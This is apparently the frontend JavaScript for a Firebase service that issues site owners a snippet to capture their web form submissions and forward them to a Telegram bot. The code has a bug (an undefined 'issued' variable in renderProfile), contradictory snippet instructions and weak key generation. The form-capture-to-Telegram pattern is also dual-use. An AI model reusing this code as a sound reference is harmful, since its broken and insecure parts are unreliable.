/* TrigifyX — frontend app (Firebase v9+ modular SDK)
 * Flow:
 *  1. User signs up / logs in (Firebase Auth)
 *  2. On first login we create a profile in Realtime Database with an API key
 *  3. User links their Telegram account (chat id or @username) -> stored in RTDB
 *  4. Site generates an embeddable <script> snippet the user adds to their site
 *  5. The snippet captures form submits and forwards them to TrigifyXbot -> user's Telegram
 *
 * Persisted profile fields (all live under users/{uid} in Realtime DB, or
 * localStorage in demo mode) so nothing has to be re-entered on next visit:
 *   apiKey, accessToken, telegram, siteUrl, apiKeyIssued
 */
import {
  createUserWithEmailAndPassword,
  signInWithEmailAndPassword,
  signOut,
  onAuthStateChanged,
  updateProfile,
  GoogleAuthProvider,
  signInWithPopup
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";
import {
  ref,
  set,
  get,
  update,
  remove
} from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

const ENV = window.__ENV__ || {};
const BOT_USERNAME = "TrigifyXbot";

let currentUser = null;

/* ---------- Demo-mode storage (localStorage) ---------- */
const Demo = {
  profile(uid) {
    return JSON.parse(localStorage.getItem("tgx_profile_" + uid) || "null");
  },
  saveProfile(uid, p) {
    localStorage.setItem("tgx_profile_" + uid, JSON.stringify(p));
  },
  user(uid) {
    return JSON.parse(localStorage.getItem("tgx_user_" + uid) || "null");
  },
  saveUser(u, p) {
    localStorage.setItem("tgx_user_" + u.uid, JSON.stringify(u));
    if (p) this.saveProfile(u.uid, p);
  },
};

function demoMode() {
  const f = window.__fb || {};
  return !f.db || window.__DEMO__ === true;
}

/* ---------- Helpers ---------- */
function $(s) { return document.querySelector(s); }
function uid() { return "u_" + Math.random().toString(36).slice(2, 10) + Date.now().toString(36); }
function apiKey() {
  const r = () => Math.random().toString(36).slice(2);
  return "tgx_" + r() + r() + r();
}
// Un-guessable per-user access token embedded in the public snippet.
// Lets the capture script fetch the user's telegram from Firebase without
// exposing it in the page source.
function accessToken() {
  const c = globalThis.crypto || globalThis.msCrypto;
  if (c && c.getRandomValues) {
    const a = new Uint8Array(36);
    c.getRandomValues(a);
    return Array.from(a, (b) => b.toString(16).padStart(2, "0")).join("");
  }
  let s = "";
  for (let i = 0; i < 72; i++) s += Math.floor(Math.random() * 16).toString(16);
  return s;
}
function toast(msg) {
  const t = $("#toast");
  t.textContent = msg;
  t.classList.add("show");
  clearTimeout(t._t);
  t._t = setTimeout(() => t.classList.remove("show"), 2200);
}
function copy(text, btn) {
  navigator.clipboard.writeText(text).then(() => {
    toast("Copied to clipboard");
    if (btn) {
      const original = btn.textContent;
      btn.textContent = "Copied";
      clearTimeout(btn._ct);
      btn._ct = setTimeout(() => { btn.textContent = original; }, 1500);
    }
  });
}

// Turns raw Firebase / network error objects into copy a user can act on.
function friendlyError(e) {
  const code = (e && e.code) || "";
  const map = {
    "auth/email-already-in-use": "That email is already registered. Try signing in instead.",
    "auth/invalid-email": "Enter a valid email address.",
    "auth/weak-password": "Password must be at least 6 characters.",
    "auth/wrong-password": "Incorrect email or password.",
    "auth/invalid-credential": "Incorrect email or password.",
    "auth/user-not-found": "No account found with that email.",
    "auth/too-many-requests": "Too many attempts. Please wait a moment and try again.",
    "auth/popup-closed-by-user": "Google sign-in was closed before completing.",
    "auth/network-request-failed": "Network error. Check your connection and try again."
  };
  if (map[code]) return map[code];
  if (e && typeof e.message === "string" && e.message && !/firebase/i.test(e.message)) {
    return e.message;
  }
  return "Something went wrong. Please try again.";
}

// Runs an async handler on a button: swaps its label while pending and
// restores it afterward, regardless of success or failure.
async function withLoading(btn, loadingLabel, fn) {
  const original = btn.textContent;
  btn.disabled = true;
  btn.textContent = loadingLabel;
  try {
    await fn();
  } finally {
    btn.disabled = false;
    btn.textContent = original;
  }
}

/* ---------- Auth ---------- */
async function signUp(email, password, name, telegram) {
  const auth = (window.__fb || {}).auth;
  const db = (window.__fb || {}).db;
  const token = accessToken();
  const profile = {
    uid: "", email, name: name || "", telegram: telegram || "",
    apiKey: apiKey(), accessToken: token, createdAt: Date.now(), plan: "free",
    apiKeyIssued: false, siteUrl: ""
  };
  if (demoMode()) {
    const u = { uid: uid(), email, name: profile.name, telegram: profile.telegram, accessToken: token };
    Demo.saveUser(u, profile);
    profile.uid = u.uid;
    return u;
  }
  const cred = await createUserWithEmailAndPassword(auth, email, password);
  profile.uid = cred.user.uid;
  if (name) {
    try { await updateProfile(cred.user, { displayName: name }); } catch (e) {}
  }
  await set(ref(db, "users/" + cred.user.uid), profile);
  // Public lookup node: token -> telegram (chat id never in the snippet).
  // Written as sub-paths so the public `verify` pings are not overwritten.
  await set(ref(db, "pub/" + token + "/telegram"), telegram || "");
  await set(ref(db, "pub/" + token + "/uid"), cred.user.uid);
  return cred.user;
}

async function signIn(email, password) {
  const auth = (window.__fb || {}).auth;
  if (demoMode()) {
    const all = Object.keys(localStorage)
      .filter(k => k.startsWith("tgx_user_"))
      .map(k => JSON.parse(localStorage.getItem(k)))
      .find(u => u.email === email);
    if (!all) throw new Error("No demo account with that email. Sign up first.");
    return all;
  }
  const cred = await signInWithEmailAndPassword(auth, email, password);
  return cred.user;
}

async function signInWithGoogle() {
  const auth = (window.__fb || {}).auth;
  if (demoMode()) {
    const u = { uid: uid(), email: "demo.google@trigifyx.app", name: "Google User", telegram: "" };
    const prof = {
      uid: u.uid, email: u.email, name: u.name, telegram: "", apiKey: apiKey(),
      createdAt: Date.now(), plan: "free", apiKeyIssued: false, siteUrl: ""
    };
    Demo.saveUser(u, prof);
    return u;
  }
  const provider = new GoogleAuthProvider();
  const cred = await signInWithPopup(auth, provider);
  return cred.user;
}

async function getProfile(u) {
  const db = (window.__fb || {}).db;
  if (demoMode()) return Demo.profile(u.uid);
  const snap = await get(ref(db, "users/" + u.uid));
  return snap.val();
}
async function saveProfile(u, p) {
  const db = (window.__fb || {}).db;
  if (demoMode()) return Demo.saveProfile(u.uid, p);
  return set(ref(db, "users/" + u.uid), p);
}

// Merge the worker-written bookkeeping from pub/{token}/meta into the
// profile object. This node is readable by the (unauthenticated) client
// and is where the worker actually stores counters / exposure / last
// submission, since it cannot write users/{uid}.
async function mergeTokenMeta(p) {
  if (!p || !p.accessToken) return;
  const db = (window.__fb || {}).db;
  if (!db) return;
  try {
    const snap = await get(ref(db, "pub/" + p.accessToken + "/meta"));
    const m = snap.val();
    if (!m) return;
    if (typeof m.submissionCount === "number") p.submissionCount = m.submissionCount;
    if (typeof m.lastSubmissionAt !== "undefined") p.lastSubmissionAt = m.lastSubmissionAt;
    if (typeof m.lastSubmissionPage !== "undefined") p.lastSubmissionPage = m.lastSubmissionPage;
    if (typeof m.exposedChances === "number") p.exposedChances = m.exposedChances;
    if (typeof m.lastExposureAt !== "undefined") p.lastExposureAt = m.lastExposureAt;
    if (typeof m.blocked === "boolean") p.blocked = m.blocked;
    window.__profile = p;
  } catch (_) { /* best-effort */ }
}

/* ---------- UI rendering ---------- */
function showAuth() {
  $("#auth-view").classList.remove("hide");
  $("#app-view").classList.add("hide");
  $("#profile-menu").classList.add("hide");
  $("#profile-menu").classList.remove("open");
}
function showApp() {
  $("#auth-view").classList.add("hide");
  $("#app-view").classList.remove("hide");
  $("#profile-menu").classList.remove("hide");
}

function renderProfile(p) {
  window.__profile = p;

  $("#disp-name").textContent = p.name || "—";
  $("#disp-email").textContent = p.email;
  $("#disp-tg").textContent = p.telegram || "—";
  $("#disp-apikey").textContent = p.accessToken || "—";
  $("#disp-plan").textContent = p.plan || "free";
  $("#disp-created").textContent = new Date(p.createdAt).toLocaleDateString();

  // Topbar profile avatar / dropdown
  const label = p.name || p.email || "";
  $("#user-avatar").textContent = label ? label.trim().charAt(0).toUpperCase() : "?";
  $("#top-uid").textContent = p.name || p.email || "";
  $("#profile-dropdown-email").textContent = p.email || "—";

  // The access token is always shown once the user exists (no separate
  // "issue" step is needed in the UI). Keep apiKeyIssued for setup gating
  // but the API-key reveal/issue UI is now hidden.
  $("#apikey-revealed").classList.remove("hide");

  // Telegram card always shows the instructions + chat id input.
  // (No separate "linked" state — the chat id is editable any time.)
  const linked = !!p.telegram;
  $("#tg-status").className = "badge " + (linked ? "ok" : "warn");
  $("#tg-status").textContent = linked ? "Linked" : "Not Linked";
  $("#tg-input").value = p.telegram || "";

  // Install snippet shows once the key has ever been issued — persisted,
  // so it doesn't hide itself again on the next visit.
  $("#install-card").classList.toggle("hide", !issued || p.setupComplete);

  // Pre-fill the saved website URL so it's never asked for twice.
  $("#site-url").value = p.siteUrl || "";

  // The setup flow (3 steps) stays visible until the user finishes setup.
  // Finishing requires: key issued + site + telegram + confirm received +
  // terms accepted. Until then we keep the steps visible.
  const setupDone = !!p.setupComplete;

  // Account Information summary block shows once setup is complete.
  $("#acct-extra").classList.toggle("hide", !setupDone);
  if (setupDone) {
    $("#acct-site").textContent = p.siteUrl;
    $("#acct-tg").textContent = p.telegram;
    $("#acct-apikey").textContent = p.accessToken || "—";
  }

  // Toggle between the setup flow and the live dashboard.
  $("#setup-main").classList.toggle("hide", setupDone);
  $("#live-main").classList.toggle("hide", !setupDone);

  updateTestMsgUI(p);

  renderSnippet(p);
  $("#snippet-2").textContent = window.__lastSnippet || "";

  if (setupDone) renderDashboard(p);
}

function renderSnippet(p) {
  // The capture script is served FROM THE WORKER (no file upload needed).
  // The snippet's <script src> points at <apiBase>/trigifyx-capture.js,
  // and the same apiBase is passed as the endpoint. Users only paste the
  // snippet - they never host any file themselves.
  const ENDPOINT = ENV.apiBase || "";
  const scriptSrc = ENDPOINT
    ? ENDPOINT.replace(/\/$/, "") + "/trigifyx-capture.js"
    : "js/trigifyx-capture.js";

  // The backend that actually delivers to Telegram (bot token stays server-side).

  // SECURITY: the public snippet contains ONLY the per-user access token
  // and the backend endpoint. The Telegram destination (chat id) and the bot
  // token are resolved server-side — never embedded in the page source.
  const token = p.accessToken || "";
  const endpointLine = ENDPOINT ? '\n    endpoint: "' + ENDPOINT + '",' : "";
  const snippet =
`<!-- TrigifyX: paste before </body> on every page with a form -->
<!-- Also upload js/trigifyx-capture.js to your site (same folder as this page) -->
<script>
  window.TRIGIFYX = {
    accessToken: "${token}",${endpointLine}
  };
</script>
<script src="${scriptSrc}" defer></script>`;

  $("#snippet").textContent = snippet;
  window.__lastSnippet = snippet;
}

function renderDashboard(p) {
  const site = p.siteUrl || "—";
  $("#disp-site-short").textContent = site.replace(/^https?:\/\//, "") || "—";
  $("#dash-site").textContent = site;
  $("#dash-tg").textContent = p.telegram || "—";
  $("#dash-terms").textContent = p.termsAcceptedAt
    ? new Date(p.termsAcceptedAt).toLocaleString()
    : "—";

  // Security / exposure state
  const exposed = p.exposedChances || 0;
  $("#dash-exposed").textContent = exposed + " / 3";
  const blocked = !!p.blocked;
  $("#blocked-banner").classList.toggle("hide", !blocked);
  const badge = $("#disp-status-badge");
  if (badge) {
    badge.className = "badge " + (blocked ? "warn" : "ok");
    badge.textContent = blocked ? "Blocked" : "Live";
  }
  // A blocked token cannot send any messages.
  if (blocked) {
    const t = $("#test-msg-btn-2");
    if (t) { t.disabled = true; t.textContent = "Token Blocked"; }
  }

  // Last submission info (written by the worker)
  $("#dash-last").textContent = p.lastSubmissionAt
    ? new Date(p.lastSubmissionAt).toLocaleString() +
      (p.lastSubmissionPage ? " · " + p.lastSubmissionPage : "")
    : "—";

  // Submission counter from the profile (authoritative, persisted by worker).
  const count = p.submissionCount || 0;
  $("#disp-submissions").textContent = count;
  const log = $("#submission-log");
  if (!count) {
    log.innerHTML = '<li class="empty">No submissions yet — they\'ll appear the moment someone fills a form.</li>';
  } else {
    // The worker stores the latest page + timestamp; render a single summary row.
    log.innerHTML =
      '<li>' +
        '<div class="sub-site">' + (p.lastSubmissionPage || "your form") + '</div>' +
        '<div class="sub-when">' + count + ' total · last ' +
          (p.lastSubmissionAt ? new Date(p.lastSubmissionAt).toLocaleString() : "—") +
        '</div>' +
      '</li>';
  }
}

const TEST_MSG_LIMIT = 3;

function updateTestMsgUI(p) {
  const used = p.testMessageCount || 0;
  const remaining = Math.max(0, TEST_MSG_LIMIT - used);
  $("#test-msg-count").textContent =
    remaining + " test message" + (remaining === 1 ? "" : "s") + " left";
  const disabled = remaining <= 0 || !p.telegram;
  const btn = $("#test-msg-btn");
  const btn2 = $("#test-msg-btn-2");
  if (btn) btn.disabled = disabled;
  if (btn2) btn2.disabled = disabled;
}

async function sendTestMessage() {
  const p = currentProfile() || (await getProfile(currentUser));
  const used = p.testMessageCount || 0;

  if (used >= TEST_MSG_LIMIT) {
    toast("You've used all " + TEST_MSG_LIMIT + " test messages");
    return;
  }
  if (!p.telegram) {
    toast("Link your Telegram chat ID first");
    return;
  }

  await withLoading($("#test-msg-btn"), "Sending…", async () => {
    try {
      const ENDPOINT = ENV.apiBase || "";
      const res = await fetch(
        (ENDPOINT ? ENDPOINT.replace(/\/$/, "") : "") + "/test-message",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ accessToken: p.accessToken })
        }
      );
      if (!res.ok) throw new Error("Failed to send test message");

      p.testMessageCount = used + 1;
      await saveProfile(currentUser, p);
      renderProfile(p);
      toast("Test message sent to Telegram");
    } catch (e) {
      toast(friendlyError(e));
    }
  });
}

/* ---------- Validation ---------- */
function isValidSiteUrl(v) {
  return /^https?:\/\/.+\..+/i.test(v.trim());
}
function isValidTelegram(v) {
  return /^@?[\w]{3,}$/.test(v.trim()) || /^\d{4,}$/.test(v.trim());
}

/* ---------- Wire up ---------- */
function bindUI() {
  $("#tab-signin").onclick = () => switchTab("in");
  $("#tab-signup").onclick = () => switchTab("up");

  // Profile avatar dropdown (shows the logout action)
  $("#profile-trigger").onclick = (e) => {
    e.stopPropagation();
    const menu = $("#profile-menu");
    const open = menu.classList.toggle("open");
    $("#profile-trigger").setAttribute("aria-expanded", open ? "true" : "false");
  };
  document.addEventListener("click", (e) => {
    const menu = $("#profile-menu");
    if (menu.classList.contains("open") && !menu.contains(e.target)) {
      menu.classList.remove("open");
      $("#profile-trigger").setAttribute("aria-expanded", "false");
    }
  });
  document.addEventListener("keydown", (e) => {
    if (e.key === "Escape") {
      $("#profile-menu").classList.remove("open");
      $("#profile-trigger").setAttribute("aria-expanded", "false");
    }
  });

  $("#auth-google").onclick = async () => {
    await withLoading($("#auth-google"), "Connecting…", async () => {
      try {
        const u = await signInWithGoogle();
        await onLogin(u);
      } catch (e) {
        toast(friendlyError(e));
      }
    });
  };

  $("#auth-submit").onclick = async () => {
    const email = $("#auth-email").value.trim();
    const pass = $("#auth-pass").value;
    const isUp = $("#auth-mode").value === "up";

    if (isUp) {
      const name = $("#auth-name").value.trim();
      const tg = $("#auth-tg").value.trim();
      const pass2 = $("#auth-pass2").value;
      if (!name) return toast("Enter your full name");
      if (!email || !pass) return toast("Enter email and password");
      if (pass.length < 6) return toast("Password must be at least 6 characters");
      if (pass !== pass2) return toast("Passwords do not match");
      await withLoading($("#auth-submit"), "Creating account…", async () => {
        try {
          const u = await signUp(email, pass, name, tg);
          await onLogin(u);
        } catch (e) {
          toast(friendlyError(e));
        }
      });
      return;
    }

    if (!email || !pass) return toast("Enter email and password");
    await withLoading($("#auth-submit"), "Signing in…", async () => {
      try {
        const u = await signIn(email, pass);
        await onLogin(u);
      } catch (e) {
        toast(friendlyError(e));
      }
    });
  };

  // Enter-key submits the auth form from any of its inputs.
  ["auth-email", "auth-pass", "auth-pass2", "auth-name", "auth-tg"].forEach((id) => {
    const el = $("#" + id);
    if (el) el.addEventListener("keydown", (e) => {
      if (e.key === "Enter") $("#auth-submit").click();
    });
  });

  $("#logout").onclick = async () => {
    const auth = (window.__fb || {}).auth;
    if (!demoMode() && auth) await signOut(auth);
    currentUser = null;
    window.__profile = null;
    showAuth();
  };

  $("#tg-save").onclick = async () => {
    const val = $("#tg-input").value.trim();
    if (!val) return toast("Enter your Telegram chat id");
    if (!isValidTelegram(val)) return toast("Enter a numeric Chat ID or a @username");
    await withLoading($("#tg-save"), "Linking…", async () => {
      const p = await getProfile(currentUser);
      p.telegram = val;
      await saveProfile(currentUser, p);
      const db = (window.__fb || {}).db;
      if (db && p.accessToken) {
        // Write the telegram sub-path and keep uid in sync so the worker can
        // resolve the token. siteUrl is mirrored on the public token node
        // (if already set) so the worker can validate the submission origin
        // without reading the private users/{uid} node.
        await set(ref(db, "pub/" + p.accessToken + "/telegram"), val);
        await set(ref(db, "pub/" + p.accessToken + "/uid"), p.uid);
        if (p.siteUrl) {
          await set(ref(db, "pub/" + p.accessToken + "/siteUrl"), p.siteUrl);
        }
      }
      renderProfile(p);
      toast("Telegram account linked");
    });
  };

  // The issue-key button is no longer shown in the UI; the access token is
  // revealed automatically. Keep the handler only as a no-op guard so a
  // missing element can never throw during binding.
  const issueBtn = $("#issue-key");
  if (issueBtn) {
    issueBtn.onclick = async () => {
      await withLoading(issueBtn, "Issuing…", async () => {
        const p = currentProfile() || (await getProfile(currentUser));
        p.apiKeyIssued = true;
        await saveProfile(currentUser, p);
        renderProfile(p);
        toast("API key issued");
      });
    };
  }

  // Save the user's website URL and persist it to Firebase / localStorage
  // so the field arrives already filled in on the next visit.
  $("#site-save").onclick = async () => {
    const raw = $("#site-url").value.trim();
    if (!raw) return toast("Enter your website URL");
    if (!isValidSiteUrl(raw)) return toast("Include the full URL, e.g. https://yoursite.com");
    // Store only the origin (scheme + host + port) so it matches the
    // worker's origin-based site authentication regardless of any path.
    let origin;
    try {
      origin = new URL(raw).origin;
    } catch (_) {
      return toast("Enter a valid URL");
    }
    await withLoading($("#site-save"), "Saving…", async () => {
      const p = await getProfile(currentUser);
      p.siteUrl = origin;
      await saveProfile(currentUser, p);
      // Mirror the origin onto the public token node so the worker can
      // validate the submission origin without reading the private
      // users/{uid} node (which is locked to the owner's auth).
      const db = (window.__fb || {}).db;
      if (db && p.accessToken) {
        await set(ref(db, "pub/" + p.accessToken + "/siteUrl"), origin);
      }
      renderProfile(p);
      toast("Website saved");
    });
  };

  $("#copy-key").onclick = () => copy($("#disp-apikey").textContent, $("#copy-key"));
  $("#copy-snippet").onclick = () => copy(window.__lastSnippet || "", $("#copy-snippet"));
  $("#copy-snippet-2").onclick = () => copy(window.__lastSnippet || "", $("#copy-snippet-2"));

  $("#test-msg-btn").onclick = sendTestMessage;
  $("#test-msg-btn-2").onclick = sendTestMessage;

  // Finish-setup gating: both checkboxes must be ticked before the user can
  // complete onboarding.
  const refreshFinish = () => {
    const p = currentProfile();
    const ready = p && p.setupComplete ? true
      : ($("#received-check").checked && $("#terms-check").checked);
    $("#finish-setup").disabled = !ready;
  };
  $("#received-check").onchange = refreshFinish;
  $("#terms-check").onchange = refreshFinish;

  $("#finish-setup").onclick = async () => {
    const p = currentProfile() || (await getProfile(currentUser));
    if (!$("#received-check").checked) return toast("Confirm you received the test message");
    if (!$("#terms-check").checked) return toast("Please accept the Terms & Conditions");
    if (!p.termsAcceptedAt) p.termsAcceptedAt = new Date().toISOString();
    p.setupComplete = true;
    await saveProfile(currentUser, p);
    renderProfile(p);
    toast("Setup complete — you're all set!");
  };

  // Terms & Conditions modal
  const openTerms = () => $("#terms-modal").classList.remove("hide");
  const closeTerms = () => $("#terms-modal").classList.add("hide");
  $("#terms-open").onclick = (e) => { e.preventDefault(); openTerms(); };
  $("#terms-close").onclick = closeTerms;
  $("#terms-modal").addEventListener("click", (e) => {
    if (e.target === $("#terms-modal")) closeTerms();
  });
  $("#terms-accept").onclick = () => {
    const p = currentProfile();
    if (p) p.termsAcceptedAt = new Date().toISOString();
    $("#terms-check").checked = true;
    closeTerms();
    refreshFinish();
    toast("Terms accepted");
  };

  // Re-open the setup flow from the live dashboard to edit settings.
  $("#edit-settings").onclick = () => {
    const p = currentProfile();
    if (p) { p.setupComplete = false; saveProfile(currentUser, p); }
    renderProfile(p);
  };

  $("#regen").onclick = async () => {
    const ok = confirm(
      "Regenerating your access token will break any install snippet already live on a site until you update it there too. Continue?"
    );
    if (!ok) return;
    await withLoading($("#regen"), "Regenerating…", async () => {
      const p = await getProfile(currentUser);
      const oldToken = p.accessToken;
      const newToken = accessToken();
      p.accessToken = newToken;
      // apiKey is preserved for future use.
      await saveProfile(currentUser, p);

      const db = (window.__fb || {}).db;
      if (db) {
        // Write the new public token node.
        await set(ref(db, "pub/" + newToken + "/telegram"), p.telegram || "");
        await set(ref(db, "pub/" + newToken + "/uid"), p.uid);
        if (p.siteUrl) {
          await set(ref(db, "pub/" + newToken + "/siteUrl"), p.siteUrl);
        }
        // Roll over: remove the old token's public node so it can no
        // longer be used to deliver submissions.
        if (oldToken && oldToken !== newToken) {
          try { await remove(ref(db, "pub/" + oldToken)); } catch (_) {}
        }
      }

      renderProfile(p);
      toast("New access token generated — update your install snippet");
    });
  };
}

/* ---------- Helpers for site verification ---------- */

function currentProfile() {
  return window.__profile || null;
}

function switchTab(mode) {
  $("#auth-mode").value = mode;
  const up = mode === "up";
  $("#tab-signup").classList.toggle("active", up);
  $("#tab-signin").classList.toggle("active", !up);
  $("#auth-title").textContent = up ? "Create your TrigifyX account" : "Welcome back to TrigifyX";
  $("#auth-submit").textContent = up ? "Sign up" : "Sign in";
  const show = up ? "remove" : "add";
  $("#signup-only").classList[show]("hide");
  $("#signup-only-2").classList[show]("hide");
  if (!up) {
    $("#auth-name").value = "";
    $("#auth-tg").value = "";
    $("#auth-pass2").value = "";
  }
}

async function onLogin(u) {
  currentUser = u;
  let p = await getProfile(u);
  if (!p) {
    p = {
      uid: u.uid, email: u.email, apiKey: apiKey(), telegram: "",
      createdAt: Date.now(), plan: "free", apiKeyIssued: true, siteUrl: ""
    };
    await saveProfile(u, p);
  }

  // Backfill fields for accounts created before they existed, so returning
  // users never get asked to redo something they already set up.
  let needsSave = false;
  if (!p.accessToken) { p.accessToken = accessToken(); needsSave = true; }
  // The access token is revealed automatically now (no issue button), so
  // mark it issued to reveal the install snippet. Kept for setup gating.
  if (!p.apiKeyIssued) { p.apiKeyIssued = true; needsSave = true; }
  if (typeof p.siteUrl === "undefined") { p.siteUrl = ""; needsSave = true; }
  if (typeof p.testMessageCount === "undefined") { p.testMessageCount = 0; needsSave = true; }
  if (typeof p.setupComplete === "undefined") { p.setupComplete = false; needsSave = true; }
  if (typeof p.termsAcceptedAt === "undefined") { p.termsAcceptedAt = null; needsSave = true; }
  if (typeof p.blocked === "undefined") { p.blocked = false; needsSave = true; }
  if (typeof p.exposedChances === "undefined") { p.exposedChances = 0; needsSave = true; }
  if (typeof p.submissionCount === "undefined") { p.submissionCount = 0; needsSave = true; }
  if (typeof p.lastSubmissionAt === "undefined") { p.lastSubmissionAt = null; needsSave = true; }
  if (needsSave) await saveProfile(u, p);

  window.__profile = p;

  // Pull the worker-written bookkeeping from the public token node
  // (pub/{token}/meta). The worker cannot write users/{uid} (rules
  // restrict it to the owner), so the authoritative counters,
  // exposure state and last submission live here. Merge into p so
  // the dashboard reflects them.
  await mergeTokenMeta(p);

  // Ensure the public lookup node exists (for the capture script).
  const db = (window.__fb || {}).db;
  if (db) {
    await set(ref(db, "pub/" + p.accessToken + "/telegram"), p.telegram || "");
    await set(ref(db, "pub/" + p.accessToken + "/uid"), p.uid);
  }

  // Keep the dashboard live: refresh the merged meta periodically.
  if (window.__metaTimer) clearInterval(window.__metaTimer);
  window.__metaTimer = setInterval(async () => {
    if (!currentUser) return;
    const fresh = currentProfile();
    if (!fresh) return;
    await mergeTokenMeta(fresh);
    renderProfile(fresh);
  }, 8000);
  // If a Google/SSO user is missing required details, force profile completion.
  const missing = !p.name || !p.telegram;
  if (missing) {
    showProfileComplete(u, p);
    return;
  }
  $("#disp-uid").textContent = u.uid;
  renderProfile(p);
  showApp();
}

function showProfileComplete(u, p) {
  showAuth(); // hide dashboard
  $("#auth-view").classList.add("hide");
  $("#complete-view").classList.remove("hide");
  $("#complete-email").textContent = u.email || p.email || "—";
  $("#complete-name").value = p.name || (u.displayName || "");
  $("#complete-tg").value = p.telegram || "";
  $("#complete-save").onclick = async () => {
    const name = $("#complete-name").value.trim();
    const tg = $("#complete-tg").value.trim();
    if (!name) return toast("Please enter your full name");
    if (!tg) return toast("Please enter your Telegram username or chat id");
    await withLoading($("#complete-save"), "Saving…", async () => {
      p.name = name;
      p.telegram = tg;
      await saveProfile(u, p);
      window.__profile = p;
      $("#complete-view").classList.add("hide");
      $("#disp-uid").textContent = u.uid;
      renderProfile(p);
      showApp();
    });
  };
}

/* ---------- Boot ---------- */
function boot() {
  bindUI();
  switchTab("up");
  const auth = (window.__fb || {}).auth;
  if (!demoMode() && auth) {
    onAuthStateChanged(auth, async (u) => {
      if (u) await onLogin(u);
      else showAuth();
    });
  } else {
    showAuth();
  }
}

if ((window.__fb || {}).auth) {
  boot();
} else {
  window.addEventListener("fb-ready", boot);
}